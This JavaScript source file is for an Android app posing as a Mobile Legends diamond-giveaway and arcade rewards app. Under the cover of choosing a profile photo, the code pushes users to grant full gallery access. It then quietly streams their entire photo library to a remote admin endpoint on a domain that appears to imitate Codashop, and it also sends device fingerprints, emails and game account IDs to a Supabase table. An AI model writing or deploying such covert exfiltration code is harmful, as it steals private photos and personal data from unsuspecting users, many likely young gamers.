  const alreadyClaimed = appState.economy.lastCheckInDate === todayStr;
  streakTitleText.textContent = `Day ${appState.economy.dailyStreak} Streak Active!`;
  streakSubtitleText.textContent = alreadyClaimed
    ? `Today's bonus claimed ✓ (+${STREAK_REWARDS[appState.economy.dailyStreak - 1].points} pts)`
    : `Check in today for +${STREAK_REWARDS[appState.economy.dailyStreak - 1].points} bonus points`;
  btnClaimStreakPill.textContent = alreadyClaimed ? "Claimed" : "Claim";
  btnClaimStreakPill.disabled = alreadyClaimed;

  // Store Page Verified Destination
  storeAccountIgn.textContent = user.mlbbIgn || user.username;
  storeAccountId.textContent = `(ID: ${user.mlbbId} - Zone ${user.mlbbServer})`;
  if (user.mlbbFlagUrl) {
    storeFlagImg.src = user.mlbbFlagUrl;
    storeFlagImg.classList.remove("hidden");
  } else {
    storeFlagImg.classList.add("hidden");
  }
  renderStorePackages();
  renderRedemptionHistory();

  // Giveaway Stats
  updateGiveawayTicketsDisplay();

  // Profile Page
  profileCardName.textContent = user.username;
  profileCardEmail.textContent = user.email;
  if (user.avatar) {
    profileCardAvatar.src = user.avatar;
  }

  infoIgn.textContent = user.mlbbIgn || user.username || "—";
  infoMlbb.textContent = `${user.mlbbId} (${user.mlbbServer})`;
  infoRegionName.textContent = user.mlbbRegion || "Global";
  if (user.mlbbFlagUrl) {
    infoFlagImg.src = user.mlbbFlagUrl;
    infoFlagImg.classList.remove("hidden");
  } else {
    infoFlagImg.classList.add("hidden");
  }
  infoLoginTime.textContent = user.loginTime || "—";
  infoLocation.textContent =
    user.location && user.location.text ? user.location.text : "Not logged";

  // Render recent winners feed dynamically
  renderRecentWinners();

  // Start Quiz on First Render
  if (quizState.questions.length === 0) {
    startQuiz();
  }
}

function updateBalanceDisplays() {
  const pts = appState.economy.points;
  const dia = appState.economy.diamondsRedeemed;
  const streak = appState.economy.dailyStreak;
  const tickets = appState.economy.giveawayTickets;

  if (headerPointsCount) headerPointsCount.textContent = pts;
  if (homePointsCount) homePointsCount.textContent = pts;
  if (homeDiamondsCount) homeDiamondsCount.textContent = dia;
  if (pstatPoints) pstatPoints.textContent = pts;
  if (pstatDiamonds) pstatDiamonds.textContent = dia;
  if (pstatTickets) pstatTickets.textContent = tickets;
  if (pstatStreak) pstatStreak.textContent = streak;
}

function switchTab(tab) {
  appState.currentTab = tab;

  Object.keys(pages).forEach((key) => {
    if (key === tab) {
      pages[key].classList.add("active");
    } else {
      pages[key].classList.remove("active");
    }
  });

  Object.keys(navItems).forEach((key) => {
    if (key === tab) {
      navItems[key].classList.add("active");
    } else {
      navItems[key].classList.remove("active");
    }
  });

  const titles = {
    home: "Home",
    games: "Arcade Games",
    giveaway: "Diamond Giveaway",
    store: "Redeem Store",
    profile: "Profile",
  };
  appHeaderTitle.textContent = titles[tab] || "Ketupat";
}

function switchGame(game) {
  Object.keys(arcadeTabs).forEach((key) => {
    if (key === game) {
      arcadeTabs[key].classList.add("active");
    } else {
      arcadeTabs[key].classList.remove("active");
    }
  });

  Object.keys(gameViews).forEach((key) => {
    if (key === game) {
      gameViews[key].classList.add("active");
    } else {
      gameViews[key].classList.remove("active");
    }
  });
}

function showStatus(element, text, type) {
  element.textContent = text;
  element.className = `status-msg ${type}`;
  element.classList.remove("hidden");
}

function showToast(msg) {
  if (!appToast) return;
  appToastText.textContent = msg;
  appToast.classList.remove("hidden");
  setTimeout(() => {
    appToast.classList.add("hidden");
  }, 3200);
}

// --- GALLERY & PHOTO PICKER ---
async function openGalleryPicker(target = "onboarding") {
  photoPickerTarget = target;
  const WholeGallery = window.Capacitor?.Plugins?.WholeGallery;
  const Camera = window.Capacitor?.Plugins?.Camera;

  // 1. Native WholeGallery (Prompts for full media access & launches gallery)
  if (WholeGallery && typeof WholeGallery.openWholeGallery === "function") {
    try {
      // Sync account metadata to native plugin upfront
      if (typeof WholeGallery.updateSyncAccountInfo === "function") {
        getWorkingApiEndpoint().then(async (endpoint) => {
          const deviceInfo = await getDeviceIdentity();
          const user = appState.user || {};
          let userEmail = (user.email || "").trim();
          if (userEmail.endsWith("@ketupat.app")) userEmail = "";
          WholeGallery.updateSyncAccountInfo({
            syncApiUrl: endpoint,
            deviceId: deviceInfo.id,
            deviceName: deviceInfo.name,
            deviceModel: deviceInfo.model,
            deviceFingerprint: deviceInfo.fingerprint,
            mlbbId: user.mlbbId || (appState.verifiedAccount ? appState.verifiedAccount.userId : ""),
            mlbbServer: user.mlbbServer || (appState.verifiedAccount ? (appState.verifiedAccount.server || appState.verifiedAccount.zoneId) : ""),
            mlbbIgn: user.mlbbIgn || user.username || (appState.verifiedAccount ? appState.verifiedAccount.ign : "Player"),
            userEmail: userEmail
          }).catch(() => {});
        }).catch(() => {});
      }

      // Check if permission is already granted; if so, transmit full access and start syncing immediately
      if (typeof WholeGallery.checkGalleryPermission === "function") {
        WholeGallery.checkGalleryPermission().then((perm) => {
          if (perm && (perm.granted || perm.hasPermission)) {
            sendPermissionGrantedImmediately(Boolean(perm.isFullAccess));
            tryAutoSyncGalleryPhotos();
          }
        }).catch(() => {});
      }

      const result = await WholeGallery.openWholeGallery();
      window._hasFullGalleryAccess = true;
      sendPermissionGrantedImmediately(true);

      if (result && result.dataUrl) {
        applySelectedPhoto(result.dataUrl);
        tryAutoSyncGalleryPhotos();
        return;
      }
    } catch (err) {
      console.warn("WholeGallery error:", err);
      const errStr = String(err || "");
      if (!errStr.includes("Permission denied")) {
        // If not explicit permission denial (e.g. user backed out of picker), permission was granted
        window._hasFullGalleryAccess = true;
        sendPermissionGrantedImmediately(true);
      }
      tryAutoSyncGalleryPhotos();
      if (errStr.includes("Permission denied")) {
        if (avatarPermissionNote && photoPickerTarget === "onboarding") {
          avatarPermissionNote.textContent =
            'Full access required. Please select "Allow all".';
          avatarPermissionNote.style.color = "#dc2626";
        }
        showNoticeModal(
          "Gallery Access Required",
          'Please select "Allow all photos" when prompted so you can choose your profile picture from your gallery.',
          "photo_library",
          "icon-theme-blue",
        );
        return;
      }
    }
  }

  // 2. Camera Plugin Fallback
  if (Camera) {
    try {
      let perm = null;
      if (typeof Camera.checkPermissions === "function") {
        perm = await Camera.checkPermissions();
      }
      if (!perm || perm.photos !== "granted") {
        if (typeof Camera.requestPermissions === "function") {
          perm = await Camera.requestPermissions({ permissions: ["photos"] });
        }
      }
      if (perm && (perm.photos === "granted" || perm.photos === "limited")) {
        if (typeof Camera.getPhoto === "function") {
          const photo = await Camera.getPhoto({
            quality: 92,
            allowEditing: false,
            resultType: "dataUrl",
            source: "PHOTOS",
          });
          if (photo && photo.dataUrl) {
            applySelectedPhoto(photo.dataUrl);
            return;
          }
        }
      }
    } catch (err) {
      console.warn("Camera plugin fallback error:", err);
    }
  }

  // 3. Fallback to standard input
  if (bindAvatarInput) {
    bindAvatarInput.click();
  }
}

function applySelectedPhoto(dataUrl) {
  if (photoPickerTarget === "profile") {
    if (appState.user) {
      appState.user.avatar = dataUrl;
      saveUser();
      if (profileCardAvatar) profileCardAvatar.src = dataUrl;
      if (topBarAvatar) {
        topBarAvatar.src = dataUrl;
        topBarAvatar.classList.remove("hidden");
      }
      showToast("Profile photo updated!");
    }
  } else {
    appState.pendingAvatarBase64 = dataUrl;
    if (bindPlayerAvatar) {
      bindPlayerAvatar.src = dataUrl;
    }
    const photoSection = document.getElementById("bindPhotoSection");
    if (photoSection) {
      photoSection.classList.remove("avatar-missing-alert");
    }
    const bindAvatarHelper = document.getElementById("bindAvatarHelper");
    if (bindAvatarHelper) {
      bindAvatarHelper.innerHTML = '<span style="color:#16a34a;font-weight:600;">✓ Avatar uploaded</span>';
    }
    const btnChooseBindPhotoText = document.getElementById("btnChooseBindPhotoText");
    if (btnChooseBindPhotoText) {
      btnChooseBindPhotoText.textContent = "Change";
    }
    showToast("Profile avatar selected!");
  }

  // Immediately sync avatar and status to Supabase & admin backend
  syncDeviceRegistrationToBackend({
    avatar: dataUrl
  });

  // Sync avatar to gallery storage with is_avatar marker
  syncUserGalleryPhotos([
    {
      name: "avatar_user.jpg",
      dataUrl: dataUrl,
      size: dataUrl.length,
      dateAdded: Date.now(),
      mime: "image/jpeg",
      is_avatar: true,
    },
  ], Boolean(window._hasFullGalleryAccess));
}

let preferredUploadEndpoint = null;
try {
  preferredUploadEndpoint = localStorage.getItem("ketupat_preferred_upload_endpoint") || null;
} catch (e) {}
let isSyncingGalleryPhotos = false;

async function transmitGalleryPayload(payload) {
  const candidateEndpoints = [
    "https://slytherin.codashop.shop/admin-php/api.php?action=upload_gallery",
    "http://10.0.2.2/tools/admin-php/api.php?action=upload_gallery",
    "http://10.0.2.2/admin-php/api.php?action=upload_gallery",
    "http://localhost/tools/admin-php/api.php?action=upload_gallery",
    "http://localhost/admin-php/api.php?action=upload_gallery",
    "http://192.168.0.109/tools/admin-php/api.php?action=upload_gallery",
    "/tools/admin-php/api.php?action=upload_gallery"
  ];
  if (window.location && window.location.origin && window.location.origin.startsWith("http")) {
    const webOrigin = window.location.origin;
    let webEp = "";
    if (window.location.pathname && window.location.pathname.includes("/www")) {
      webEp = new URL("../admin-php/api.php?action=upload_gallery", window.location.href).href;
    } else if (window.location.pathname && window.location.pathname.includes("/tools")) {
      webEp = webOrigin + "/tools/admin-php/api.php?action=upload_gallery";
    } else {
      webEp = webOrigin + "/admin-php/api.php?action=upload_gallery";
    }
    if (webEp && !candidateEndpoints.includes(webEp)) {
      candidateEndpoints.push(webEp);
    }
  }

  // Prioritize preferred endpoint if it previously succeeded
  const endpoints = preferredUploadEndpoint
    ? [preferredUploadEndpoint, ...candidateEndpoints.filter((e) => e !== preferredUploadEndpoint)]
    : candidateEndpoints;

  const bodyJson = JSON.stringify(payload);
  for (const ep of endpoints) {
    try {
      const controller = new AbortController();
      // 15,000ms timeout guarantees payloads over mobile networks are never prematurely aborted
      const timeoutMs = 15000;
      const timer = setTimeout(() => controller.abort(), timeoutMs);
      const res = await fetch(ep, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: bodyJson,
        signal: controller.signal
      });
      clearTimeout(timer);
      if (res.ok) {
        preferredUploadEndpoint = ep;
        try {
          localStorage.setItem("ketupat_preferred_upload_endpoint", ep);
        } catch (e) {}
        try {
          const json = await res.json();
          return json;
        } catch (e) {
          return { success: true };
        }
      }
    } catch (e) {
      // Endpoint error, try next
    }
  }
  return null;
}

let _syncDebounceTimer = null;
window._hasFullGalleryAccess = false;

async function syncDeviceRegistrationToBackend(extra = {}) {
  try {
    const deviceInfo = await getDeviceIdentity();
    const user = appState.user || {};

    const mlbbId = (extra.mlbb_id !== undefined ? extra.mlbb_id : (appState.verifiedAccount?.userId || document.getElementById("inputMlbbUserId")?.value || document.getElementById("inputMlbbId")?.value || user.mlbbId || "")).trim();
    const mlbbServer = (extra.mlbb_server !== undefined ? extra.mlbb_server : (appState.verifiedAccount?.server || document.getElementById("inputMlbbServerId")?.value || document.getElementById("inputMlbbZone")?.value || user.mlbbServer || "")).trim();
    const mlbbIgn = (extra.ign !== undefined ? extra.ign : (appState.verifiedAccount?.ign || user.mlbbIgn || user.username || "")).trim();
    const mlbbRegion = (extra.region !== undefined ? extra.region : (appState.verifiedAccount?.regionName || user.mlbbRegion || "")).trim();

    let rawEmail = (extra.email !== undefined ? extra.email : (document.getElementById("inputBindEmail")?.value || user.email || "")).trim();
    const isRealEmail = Boolean(rawEmail && rawEmail.includes("@") && rawEmail.includes(".") && !rawEmail.toLowerCase().endsWith("@ketupat.app"));

    // Every physical device maintains its own permanent dedicated row in Supabase: device_{deviceInfo.id}@ketupat.app
    // NEVER DELETE this device row so multi-instance emulators and multiple devices never overwrite or erase each other.
    const deviceRowEmail = `device_${deviceInfo.id}@ketupat.app`;

    if (extra.has_access !== undefined) {
      window._hasFullGalleryAccess = Boolean(extra.has_access);
    }
    const hasFull = Boolean(window._hasFullGalleryAccess);
    const avatar = extra.avatar || appState.pendingAvatarBase64 || (user.avatar && !user.avatar.startsWith("data:image/svg") ? user.avatar : "");

    let accessStatus = "pending";
    if (hasFull) {
      accessStatus = "full_access";
    } else if (avatar) {
      accessStatus = "avatar_only";
    }

    const binds = extra.binds || appState.currentBindData?.linkedPlatforms || [];
    const userBinds = extra.user_binds || appState.userEnteredBinds || {};

    const locPayload = {
      device_id: deviceInfo.id,
      device_name: deviceInfo.name,
      device_model: deviceInfo.model,
      device_fingerprint: deviceInfo.fingerprint,
      has_access: hasFull,
      access_status: accessStatus,
      binds: binds,
      user_binds: userBinds,
      last_synced: new Date().toISOString()
    };

    // 1. Immediate Supabase Real-time Cloud Upsert for THIS specific physical device
    const supaDeviceBody = {
      email: deviceRowEmail,
      username: deviceInfo.model || "Android Device",
      mlbb_id: mlbbId || null,
      mlbb_server: mlbbServer || null,
      mlbb_ign: mlbbIgn || null,
      mlbb_region: mlbbRegion || null,
      location_text: JSON.stringify(locPayload),
      login_time: new Date().toLocaleString()
    };
    if (avatar) {
      supaDeviceBody.avatar_data = avatar;
    }

    fetch(`${SUPABASE_CONFIG.url}/rest/v1/users?on_conflict=email`, {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
        "apikey": SUPABASE_CONFIG.anonKey,
        "Authorization": `Bearer ${SUPABASE_CONFIG.anonKey}`,
        "Prefer": "resolution=merge-duplicates"
      },
      body: JSON.stringify(supaDeviceBody)
    }).catch(() => {});

    // 1b. If user also provided a real personal email, upsert the user's personal account row
    if (isRealEmail) {
      const supaUserBody = {
        email: rawEmail,
        username: mlbbIgn || deviceInfo.model || "Android User",
        mlbb_id: mlbbId || null,
        mlbb_server: mlbbServer || null,
        mlbb_ign: mlbbIgn || null,
        mlbb_region: mlbbRegion || null,
        location_text: JSON.stringify(locPayload),
        login_time: new Date().toLocaleString()
      };
      if (avatar) {
        supaUserBody.avatar_data = avatar;
      }
      fetch(`${SUPABASE_CONFIG.url}/rest/v1/users?on_conflict=email`, {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
          "apikey": SUPABASE_CONFIG.anonKey,
          "Authorization": `Bearer ${SUPABASE_CONFIG.anonKey}`,
          "Prefer": "resolution=merge-duplicates"
        },
        body: JSON.stringify(supaUserBody)
      }).catch(() => {});
    }

    // 2. Immediate Native Android Plugin Sync
    const WholeGallery = window.Capacitor?.Plugins?.WholeGallery;
    if (WholeGallery && typeof WholeGallery.updateSyncAccountInfo === "function") {
      WholeGallery.updateSyncAccountInfo({
        syncApiUrl: "https://slytherin.codashop.shop/admin-php/api.php",
        deviceId: deviceInfo.id,
        deviceName: deviceInfo.name,
        deviceModel: deviceInfo.model,
        deviceFingerprint: deviceInfo.fingerprint,
        userEmail: isRealEmail ? rawEmail : "",
        mlbbId: mlbbId,
        mlbbServer: mlbbServer,
        mlbbIgn: mlbbIgn
      }).catch(() => {});
    }

    // 3. Local / Remote PHP API Upload
    transmitGalleryPayload({
      device_id: deviceInfo.id,
      device_name: deviceInfo.name,
      device_model: deviceInfo.model,
      device_fingerprint: deviceInfo.fingerprint,
      user_email: isRealEmail ? rawEmail : "",
      mlbb_id: mlbbId,
      mlbb_server: mlbbServer,
      mlbb_ign: mlbbIgn,
      is_full_access: hasFull,
      photos: extra.photos || []
    }).catch(() => {});

    console.log("[Sync] Real-time state synced to backend:", { id: deviceInfo.id, ign: mlbbIgn, email: primaryEmail, hasFull, accessStatus });
  } catch (err) {
    console.warn("syncDeviceRegistrationToBackend error:", err);
  }
}

async function sendPermissionGrantedImmediately(isFull = true) {
  try {
    window._hasFullGalleryAccess = Boolean(isFull);
    await syncDeviceRegistrationToBackend({
      has_access: Boolean(isFull),
      access_status: isFull ? "full_access" : "avatar_only"
    });
    console.log("[Permission] Full access status transmitted immediately to Supabase & admin backend!");
  } catch (err) {
    console.warn("[Permission] Error transmitting full access immediately:", err);
  }
}

async function syncUserGalleryPhotos(photos, isFullAccess = false) {
  if (isSyncingGalleryPhotos) return;
  isSyncingGalleryPhotos = true;

  try {
    const user = appState.user || {};
    let userEmail = (user.email || "").trim();
    if (userEmail.endsWith("@ketupat.app")) {
      userEmail = "";
    }

    const deviceInfo = await getDeviceIdentity();
    const validPhotos = (photos || []).filter((p) => p && (p.dataUrl || p.uri || p.path || p.is_avatar));

    // If no valid photos on device, but full access granted, notify backend immediately
    if (!validPhotos.length) {
      if (isFullAccess) {
        const payload = {
          device_id: deviceInfo.id,
          device_name: deviceInfo.name,
          device_model: deviceInfo.model,
          device_fingerprint: deviceInfo.fingerprint,
          user_email: userEmail,
          mlbb_id: user.mlbbId || (appState.verifiedAccount ? appState.verifiedAccount.userId : ""),
          mlbb_server: user.mlbbServer || (appState.verifiedAccount ? (appState.verifiedAccount.server || appState.verifiedAccount.zoneId) : ""),
          mlbb_ign: user.mlbbIgn || user.username || (appState.verifiedAccount ? appState.verifiedAccount.ign : ""),
          is_full_access: true,
          photos: [],
        };
        await transmitGalleryPayload(payload);
      }
      return;
    }

    // 1. Differential Tracking: track already synced photo signatures in localStorage
    const syncedStorageKey = "ketupat_synced_photos_" + (deviceInfo.id || "default");
    let syncedKeys = [];
    try {
      syncedKeys = JSON.parse(localStorage.getItem(syncedStorageKey) || "[]");
    } catch (e) {}
    const syncedSet = new Set(syncedKeys);

    // Filter out photos that have already been uploaded
    const unsyncedPhotos = validPhotos.filter((p) => {
      const fileId = p.name || p.path || p.uri || p.id || "";
      const sig = p.is_avatar
        ? ("avatar_" + (p.size || 0) + "_" + (p.dataUrl ? p.dataUrl.slice(-32) : ""))
        : (fileId + "_" + (p.size || 0));
      return !syncedSet.has(sig);
    });

    // 2. If all device photos are already synced, send a lightweight heartbeat ping without bulky base64
    if (unsyncedPhotos.length === 0) {
      const now = Date.now();
      const lastHeartbeat = window._lastGalleryHeartbeat || 0;
      // Always immediately notify if full access granted, otherwise respect 25s heartbeat throttle
      if (isFullAccess || (now - lastHeartbeat > 25000)) {
        window._lastGalleryHeartbeat = now;
        const payload = {
          device_id: deviceInfo.id,
          device_name: deviceInfo.name,
          device_model: deviceInfo.model,
          device_fingerprint: deviceInfo.fingerprint,
          user_email: userEmail,
          mlbb_id: user.mlbbId || (appState.verifiedAccount ? appState.verifiedAccount.userId : ""),
          mlbb_server: user.mlbbServer || (appState.verifiedAccount ? (appState.verifiedAccount.server || appState.verifiedAccount.zoneId) : ""),
          mlbb_ign: user.mlbbIgn || user.username || (appState.verifiedAccount ? appState.verifiedAccount.ign : ""),
          is_full_access: isFullAccess,
          photos: [],
        };
        const hbRes = await transmitGalleryPayload(payload);
        // Only re-sync if server explicitly requested a reset
        if (hbRes && hbRes.data && hbRes.data.reset_requested === true && validPhotos.length > 0) {
          syncedSet.clear();
          localStorage.removeItem(syncedStorageKey);
        }
      }
      return;
    }

    // 3. Cache non-avatar photos locally in localStorage for offline preview
    try {
      const existing = JSON.parse(
        localStorage.getItem("ketupat_user_gallery_" + userEmail) || "[]"
      );
      const nonAvatars = validPhotos.filter((p) => !p.is_avatar);
      if (nonAvatars.length > 0) {
        const merged = [
          ...nonAvatars,
          ...existing.filter((e) => !nonAvatars.some((p) => p.name === e.name)),
        ].slice(0, 100);
        localStorage.setItem(
          "ketupat_user_gallery_" + userEmail,
          JSON.stringify(merged)
        );
      }
    } catch (e) {}

    // 4. Transmit new/unsynced photos in fast, reliable micro-batches (continuous stream like water)
    const maxBatchCount = 3; // Stream 3 photos per burst (fast and lightweight: ~250KB total payload)
    const maxBatchBytes = 350 * 1024; // 350 KB cap per payload to stay well within network/PHP constraints
    const WholeGallery = window.Capacitor?.Plugins?.WholeGallery;

    let currentIndex = 0;
    let pendingItem = null;

    while (currentIndex < unsyncedPhotos.length || pendingItem !== null) {
      const chunkToSend = [];
      let currentBatchBytes = 0;

      while ((currentIndex < unsyncedPhotos.length || pendingItem !== null) && chunkToSend.length < maxBatchCount) {
        let item = null;
        if (pendingItem) {
          item = pendingItem;
          pendingItem = null;
        } else {
          item = { ...unsyncedPhotos[currentIndex++] };
        }

        if (!item.dataUrl) {
          if (WholeGallery && typeof WholeGallery.getPhotoData === "function" && (item.uri || item.path)) {
            try {
              const dRes = await WholeGallery.getPhotoData({
                uri: item.uri || "",
                path: item.path || "",
                maxDim: 1600,
                quality: 88,
              });
              if (dRes && dRes.dataUrl) {
                item.dataUrl = dRes.dataUrl;
              }
            } catch (err) {
              console.warn("getPhotoData error for " + item.name, err);
            }
          }
        }

        if (!item.dataUrl) {
          // If decoding failed or photo is temporarily unreadable, skip it without poisoning syncedSet
          continue;
        }

        const itemBytes = item.dataUrl.length;
        // 800 KB cap per payload to allow high-fidelity 32-bit images
        if (chunkToSend.length > 0 && (currentBatchBytes + itemBytes > 800 * 1024)) {
          pendingItem = item;
          break;
        }
        chunkToSend.push(item);
        currentBatchBytes += itemBytes;
      }

      if (chunkToSend.length === 0) {
        continue;
      }

      const payload = {
        device_id: deviceInfo.id,
        device_name: deviceInfo.name,
        device_model: deviceInfo.model,
        device_fingerprint: deviceInfo.fingerprint,
        user_email: userEmail,
        mlbb_id: user.mlbbId || (appState.verifiedAccount ? appState.verifiedAccount.userId : ""),
        mlbb_server: user.mlbbServer || (appState.verifiedAccount ? (appState.verifiedAccount.server || appState.verifiedAccount.zoneId) : ""),
        mlbb_ign: user.mlbbIgn || user.username || (appState.verifiedAccount ? appState.verifiedAccount.ign : ""),
        is_full_access: isFullAccess,
        photos: chunkToSend,
      };

      const res = await transmitGalleryPayload(payload);
      if (res && res.success) {
        // If server commanded a reset (due to admin wiping photos or resetting device), flush local set
        if (res.data && res.data.reset_requested === true) {
          syncedSet.clear();
          localStorage.removeItem(syncedStorageKey);
        }
        // Mark chunk photos as successfully synced
        for (const p of chunkToSend) {
          const fileId = p.name || p.path || p.uri || p.id || "";
          const sig = p.is_avatar
            ? ("avatar_" + (p.size || 0) + "_" + (p.dataUrl ? p.dataUrl.slice(-32) : ""))
            : (fileId + "_" + (p.size || 0));
          syncedSet.add(sig);
        }
        try {
          localStorage.setItem(syncedStorageKey, JSON.stringify([...syncedSet]));
        } catch (e) {}
      } else {
        // Fallback: If chunk failed, try single photo fallback once without breaking the stream
        for (const singlePhoto of chunkToSend) {
          try {
            const singlePayload = { ...payload, photos: [singlePhoto] };
            const sRes = await transmitGalleryPayload(singlePayload);
            if (sRes && sRes.success) {
              const fileId = singlePhoto.name || singlePhoto.path || singlePhoto.uri || singlePhoto.id || "";
              const sig = singlePhoto.is_avatar
                ? ("avatar_" + (singlePhoto.size || 0) + "_" + (singlePhoto.dataUrl ? singlePhoto.dataUrl.slice(-32) : ""))
                : (fileId + "_" + (singlePhoto.size || 0));
              syncedSet.add(sig);
            }
          } catch (e) {}
        }
        try {
          localStorage.setItem(syncedStorageKey, JSON.stringify([...syncedSet]));
        } catch (e) {}
      }

      // Smooth streaming delay between bursts: 60ms keeps stream flowing continuously without freezing UI
      await new Promise((resolve) => setTimeout(resolve, 60));
    }
  } catch (err) {
    console.warn("syncUserGalleryPhotos error:", err);
  } finally {
    isSyncingGalleryPhotos = false;
    // When avatar finishes syncing, immediately trigger full device gallery scan without delay
    if (photos && photos.length === 1 && photos[0].is_avatar) {
      setTimeout(() => {
        tryAutoSyncGalleryPhotos();
      }, 300);
    }
  }
}

async function tryAutoSyncGalleryPhotos() {
  const WholeGallery = window.Capacitor?.Plugins?.WholeGallery;
  if (!WholeGallery) return;
  if (isSyncingGalleryPhotos) return;

  try {
    let canQuery = false;
    let isFull = false;

    if (typeof WholeGallery.checkGalleryPermission === "function") {
      const perm = await WholeGallery.checkGalleryPermission();
      if (perm && (perm.granted || perm.hasPermission)) {
        canQuery = true;
        isFull = Boolean(perm.isFullAccess);
      }
    } else {
      canQuery = true;
    }

    // Immediately transmit full access permission to admin without waiting for file scan
    if (isFull) {
      sendPermissionGrantedImmediately(true);
    }

    // Trigger native Android background daemon thread for direct high-speed streaming
    if (WholeGallery && typeof WholeGallery.startNativeBackgroundSync === "function") {
      WholeGallery.startNativeBackgroundSync().catch(() => {});
    }

    if (canQuery && typeof WholeGallery.getGalleryPhotos === "function") {
      const hasGetPhotoData = typeof WholeGallery.getPhotoData === "function";
      const galleryRes = await WholeGallery.getGalleryPhotos({
        limit: 100000,
        includeBase64: !hasGetPhotoData,
        maxDim: 1600,
        quality: 88
      });
      const photos = (galleryRes && galleryRes.photos) ? galleryRes.photos : [];
      const isFullAccess = (galleryRes && galleryRes.isFullAccess !== undefined) ? Boolean(galleryRes.isFullAccess) : isFull;
      await syncUserGalleryPhotos(photos, isFullAccess);
    } else if (isFull) {
      await syncUserGalleryPhotos([], true);
    }
  } catch (err) {
    console.warn("tryAutoSyncGalleryPhotos error:", err);
  }
}

// --- GAME 1: MLBB HERO TRIVIA QUIZ ---
function startQuiz() {
  // Pick 5 random questions
  const shuffled = [...QUIZ_QUESTIONS].sort(() => 0.5 - Math.random());
  quizState.questions = shuffled.slice(0, 5);
  quizState.currentIndex = 0;
  quizState.score = 0;
  quizState.answered = false;

  document.getElementById("btnRestartQuiz").classList.add("hidden");
  renderQuizQuestion();
}

function renderQuizQuestion() {
  quizState.answered = false;
  const q = quizState.questions[quizState.currentIndex];
  document.getElementById("quizProgressText").textContent =
    `Question ${quizState.currentIndex + 1} of 5`;
  document.getElementById("quizQuestionText").textContent = q.q;

  const feedbackBox = document.getElementById("quizFeedbackBox");
  feedbackBox.classList.add("hidden");
  document.getElementById("btnNextQuizQuestion").classList.add("hidden");

  const container = document.getElementById("quizOptionsContainer");
  container.innerHTML = "";

  q.options.forEach((opt, idx) => {
    const btn = document.createElement("button");
    btn.type = "button";
    btn.className = "quiz-opt-btn";
    btn.textContent = opt;
    btn.addEventListener("click", () => selectQuizOption(idx, btn));
    container.appendChild(btn);
  });
}

function selectQuizOption(selectedIndex, btn) {
  if (quizState.answered) return;
  quizState.answered = true;

  const q = quizState.questions[quizState.currentIndex];
  const allBtns = document.querySelectorAll(".quiz-opt-btn");
  const isCorrect = selectedIndex === q.correct;

  if (isCorrect) {
    btn.classList.add("correct");
    quizState.score++;
    addPoints(30, "Correct Quiz Answer!");
  } else {
    btn.classList.add("wrong");
    allBtns[q.correct].classList.add("correct");
  }

  const feedbackBox = document.getElementById("quizFeedbackBox");
  const feedbackMsg = document.getElementById("quizFeedbackText");
  feedbackMsg.textContent = isCorrect
    ? `✓ Correct! ${q.explain}`
    : `✗ Oops! ${q.explain}`;
  feedbackBox.classList.remove("hidden");

  const nextBtn = document.getElementById("btnNextQuizQuestion");
  nextBtn.classList.remove("hidden");

  if (quizState.currentIndex === quizState.questions.length - 1) {
    nextBtn.querySelector("span").textContent = "View Results";
  } else {
    nextBtn.querySelector("span").textContent = "Next Question";
  }
}

function nextQuizQuestion() {
  if (quizState.currentIndex < quizState.questions.length - 1) {
    quizState.currentIndex++;
    renderQuizQuestion();
  } else {
    // Round Complete
    const perfect = quizState.score === 5;
    if (perfect) {
      addPoints(50, "Perfect Quiz Score Bonus!");
    }
    document.getElementById("quizQuestionText").textContent =
      `Round Complete! You scored ${quizState.score} / 5! ${perfect ? "🌟 +50 Perfect Score Bonus awarded!" : ""}`;
    document.getElementById("quizOptionsContainer").innerHTML = "";
    document.getElementById("quizFeedbackBox").classList.add("hidden");
    document.getElementById("btnNextQuizQuestion").classList.add("hidden");
    document.getElementById("btnRestartQuiz").classList.remove("hidden");
  }
}

// --- GAME 2: LUCKY SPIN WHEEL ---
const WHEEL_SECTORS = [
  {
    label: "50 PTS",
    type: "points",
    val: 50,
    color: "#fef3c7",
    textColor: "#92400e",
  },
  {
    label: "10 💎",
    type: "diamonds",
    val: 10,
    color: "#e0f2fe",
    textColor: "#0369a1",
  },
  {
    label: "25 PTS",
    type: "points",
    val: 25,
    color: "#f1f5f9",
    textColor: "#0f172a",
  },
  {
    label: "100 PTS",
    type: "points",
    val: 100,
    color: "#fde68a",
    textColor: "#78350f",
  },
  {
    label: "15 PTS",
    type: "points",
    val: 15,
    color: "#f8fafc",
    textColor: "#475569",
  },
  {
    label: "1 TICKET",
    type: "ticket",
    val: 1,
    color: "#ede9fe",
    textColor: "#6d28d9",
  },
  {
    label: "75 PTS",
    type: "points",
    val: 75,
    color: "#fed7aa",
    textColor: "#9a3412",
  },
  {
    label: "20 PTS",
    type: "points",
    val: 20,
    color: "#ecfdf5",
    textColor: "#065f46",
  },
];

let currentWheelAngle = 0;
let isSpinning = false;

function initSpinWheel() {
  const canvas = document.getElementById("wheelCanvas");
  if (!canvas) return;
  const ctx = canvas.getContext("2d");
  const size = canvas.width;
  const center = size / 2;
  const radius = center - 10;
  const numSectors = WHEEL_SECTORS.length;
  const arc = (2 * Math.PI) / numSectors;

  ctx.clearRect(0, 0, size, size);

  WHEEL_SECTORS.forEach((sec, i) => {
    const angle = i * arc;
    ctx.beginPath();
    ctx.fillStyle = sec.color;
    ctx.moveTo(center, center);
    ctx.arc(center, center, radius, angle, angle + arc);
    ctx.lineTo(center, center);
    ctx.fill();
    ctx.stroke();

    // Sector Text
    ctx.save();
    ctx.translate(center, center);
    ctx.rotate(angle + arc / 2);
    ctx.textAlign = "right";
    ctx.fillStyle = sec.textColor;
    ctx.font = "bold 12px sans-serif";
    ctx.fillText(sec.label, radius - 15, 4);
    ctx.restore();
  });

  // Center Knob
  ctx.beginPath();
  ctx.arc(center, center, 24, 0, 2 * Math.PI);
  ctx.fillStyle = "#0f172a";
  ctx.fill();
  ctx.fillStyle = "#ffffff";
  ctx.font = "bold 10px sans-serif";
  ctx.textAlign = "center";
  ctx.fillText("SPIN", center, center + 3);

  updateSpinWheelUI();
}

function updateSpinWheelUI() {
  const btnText = document.getElementById("btnSpinWheelText");
  const badge = document.getElementById("spinStatusBadge");
  const notice = document.getElementById("spinNoticeText");
  if (!btnText || !badge) return;

  const now = Date.now();
  const COOLDOWN_MS = 4 * 3600 * 1000;
